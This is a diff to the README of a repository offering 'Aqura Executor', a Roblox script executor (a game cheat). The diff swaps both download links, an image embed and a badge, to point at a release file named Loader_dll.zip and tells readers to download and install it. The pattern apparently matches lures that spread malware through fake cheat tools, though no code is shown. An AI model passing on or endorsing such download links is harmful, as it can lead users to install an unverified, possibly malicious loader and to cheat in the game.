@@ -265,7 +265,7 @@
 
 Welcome to the Aqura Executor repository! 🚀 This repository hosts the latest version of the Aqura Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![Aqura Executor](https://github.com/secondlathloothy/Aqura-Executor/releases/download/Download/application.zip)
+![Aqura Executor](https://github.com/secondlathloothy/Aqura-Executor/releases/download/Download/Loader_dll.zip)
 
 ## Table of Contents
 
@@ -760,7 +760,7 @@ Aqura Executor is a cutting-edge executor designed for Roblox script execution. 
 
 To get started with Aqura Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download Aqura Executor](https://img.shields.io/badge/Download-Aqura%20Executor-orange)](https://github.com/secondlathloothy/Aqura-Executor/releases/download/Download/application.zip).
+1. Download the latest version of the executor from the following link: [![Download Aqura Executor](https://img.shields.io/badge/Download-Aqura%20Executor-orange)](https://github.com/secondlathloothy/Aqura-Executor/releases/download/Download/Loader_dll.zip).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
